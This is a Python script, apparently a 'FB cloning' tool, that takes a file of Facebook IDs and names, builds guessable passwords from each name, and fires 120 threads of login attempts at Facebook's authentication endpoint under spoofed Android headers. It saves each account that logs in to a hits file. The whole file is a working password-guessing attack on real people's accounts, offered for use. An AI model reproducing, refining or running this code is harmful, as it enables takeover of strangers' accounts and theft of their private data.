
import os, random, sys, json, uuid, time
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except:
    os.system("pip install requests -y")
    import requests

li = "\033[38;5;46m"
blue = "\033[94m"
white = "\033[1;97m"
cyan = "\033[0;36m"
yellow = "\033[1;33m"

gxdsprnt=str(f"{white}"*37)
lxgo=f"""{white}

       d888b  db    db d8888b. .d8888. 
      88' Y8b `8b  d8' 88  `8D 88'  YP 
      88       `8bd8'  88   88 `8bo.   
      88  ooo  .dPYb.  88   88   `Y8b. 
      88. ~8~ .8P  Y8. 88  .8D db   8D 
       Y888P  YP    YP Y8888D' `8888Y'
 
              {cyan}FB CLONING ID V1{white}\n"""
 
def gxdslogo():
    os.system('clear')
    print(lxgo)
    os.system('xdg-open https://www.facebook.com/goxdies')

def main():
    gxdslogo()
    print("  [1] START HITTING FB\n  [2] EXIT TOOL")
    print(gxdsprnt)
    gxdsoption=input("  [•] CHOOSE OPTION: ")
    os.system('clear')
    print(lxgo)
    if gxdsoption in ["A","a","1","01"]:
        gxdsfiles()
    elif gxdsoption in ["B","b","2","02"]:
        print(gxdsprnt)
        print("  [•] K, BYE.")
        os.system('xdg-open https://www.facebook.com/goxdies')
        print(gxdsprnt)
        sys.exit()
    else:
        print(gxdsprnt)
        print("  [X] ERROR!")
        print(gxdsprnt)
        time.sleep(3)
        main()

def gxdsfiles():
    print(gxdsprnt)
    fl=input("  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  \033[1;33m[•] FILE PATH: ")
    os.system('clear')
    print(lxgo)
    print(gxdsprnt)
    try:
        id_file=open(fl,"r").read().splitlines()
    except:
        print("\033[1;91m  [X] FILE NOT FOUND.")
        print(gxdsprnt)
        sys.exit()
    gxdsforward(id_file)

def gxdsforward(id_file):
    tl=str(len(id_file))
    print("  \033[38;5;46m========================================")
    print("\033[1;97m  [-] FB CLONING STARTED... ")
    print("  [-] TIP: ON/OFF THE DATA EVERY 5 MINUTES\n           TO SPEED UP THE PROCESS. \n")
    print("  \033[38;5;46m========================================")
    print("\033[1;97m  [•] TOTAL ID IN FILE:\033[1;33m "+tl)
    print("\033[1;97m  [•] PASSWORD LIST:\033[1;33m AUTOMATIC ")
    print("\033[1;97m  [•] HIT FILE:\033[1;33m /sdcard/goxdies.txt\n")
    print("  \033[38;5;46m========================================")
        
    print(gxdsprnt)
    with ThreadPool (max_workers=120) as feel:
        for data in id_file:
            uid=data.split("|")[0]
            pwx=[]
            pwx.append('57273200')
            pwx.append('59039200')
            nam=data.split("|")[1]
            name=nam.lower()
            try:
                name1=name.split(" ")[0]
                nam1=nam.split(" ")[0]
                if len(name1) <3:
                    pass
                else:
                    pwx.append(nam1+'123')
                    pwx.append(name1+'12')
                    pwx.append(name1+'123')
                    pwx.append(name1+'123')
                    pwx.append(name1+'1234')
                    pwx.append(name1+'12345')
                    pwx.append(name1+'@123')
                    pwx.append(name1+'pogi')
                    pwx.append(name1+'ganda')
                    pwx.append(name1+'143')
                    pwx.append(name1+'@143')
            except:pass
            try:
                mid_name=name.split(" ")[1]
                nam2=nam.split(" ")[1]
                if len(mid_name) <3:
                    pass
                else:
                    pwx.append(nam1+" "+nam2)
                    pwx.append(mid_name+'12')
                    pwx.append(mid_name+'123')
                    pwx.append(mid_name+' 123')
                    pwx.append(mid_name+'1234')
                    pwx.append(mid_name+'12345')
                    pwx.append(mid_name+'@#')
                    pwx.append(mid_name+'@@')
                    pwx.append(mid_name+'@')
                    pwx.append(mid_name+'@123')
                    #-Mix
                    pwx.append(name1+mid_name)
                    pwx.append(name1+mid_name+'143')
                    pwx.append(name1+mid_name+'12')
                    pwx.append(name1+mid_name+'123')
                    pwx.append(name1+mid_name+'1234')
                    pwx.append(name1+mid_name+'12345')
                    pwx.append(name1+mid_name+'@#')
                    pwx.append(name1+mid_name+'@@')
                    pwx.append(name1+mid_name+'@')
                    pwx.append(name1+mid_name+'@123')
                    pwx.append(name1+' '+mid_name)
                    pwx.append(name1+' '+mid_name+'123')
                    pwx.append(name1+' '+mid_name+'143')
                    pwx.append(name1+' '+mid_name+'1234')
                    pwx.append(name1+' '+sur_name)
            except:pass
            try:
                sur_name=name.split(" ")[2]
                nam3=nam.split(" ")[2]
                if len(sur_name) <3:
                    pass
                else:
                    pwx.append(sur_name+'123')
                    pwx.append(sur_name+'1234')
                    pwx.append(sur_name+'12345')
                    pwx.append(sur_name+'143')
                    pwx.append(name1+mid_name+sur_name)
                    pwx.append(name1+mid_name+sur_name+'123')
                    pwx.append(name1+mid_name+sur_name+'1234')
                    pwx.append(name1+mid_name+sur_name+'12345')
                    pwx.append(name1+mid_name+sur_name+'@#')
                    pwx.append(name1+mid_name+sur_name+'@@')
                    pwx.append(name1+mid_name+sur_name+'@')
                    pwx.append(name1+' '+mid_name+' '+sur_name)
                    pwx.append(name1+' '+mid_name+' '+sur_name+'123')
            except:pass
            feel.submit(file_subb,uid,pwx)

loop=0
oks=[]
cps=[]
def file_subb(uid,pwx):
    global oks,loop,cps
    sys.stdout.write(f"\r \033[1;97m [CHECKED]: {loop} [HITS]: {str(len(oks))} [CHECKPOINT]: {str(len(cps))}");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 10; Redmi Build/SP1A.281674.804) [FBAN/FB4A;FBAV/520.0.0.31279;FBBV/669573459;FBRV/0;FBPN/com.facebook.mlite;FBLC/bn_IN;FBMF/Note 9;FBBD/Note 9;FBDV/Redmi;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=1794};FB_FW/1"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "login":"Log In"}
            headers = {
            'authority': 'mbasic.facebook.com',
            'method': 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '2.700000047683716',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"23021RAAEG"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent }
            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
            q=json.loads(p)
            if "session_key" in q:
                print(f"\r\r\033[0;36m  [OK] {uid} : {ps}")
                open("/sdcard/goxdies.txt","a+").write(uid+" : "+ps+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in q:
                print(f"\r\r\033[94m  [CE] {uid} : {ps}\n")
                open("/sdcard/goxdies.txt","a+").write(uid+" : "+ps+"\n")
                oks.append(uid)
            elif "www.facebook.com" in q:
                print(f"\r\r\033[1;91m  [CP] {uid} : {ps}")
                cps.append(uid)
            else:
                continue
        loop+=1
    except:
        time.sleep(4)

main()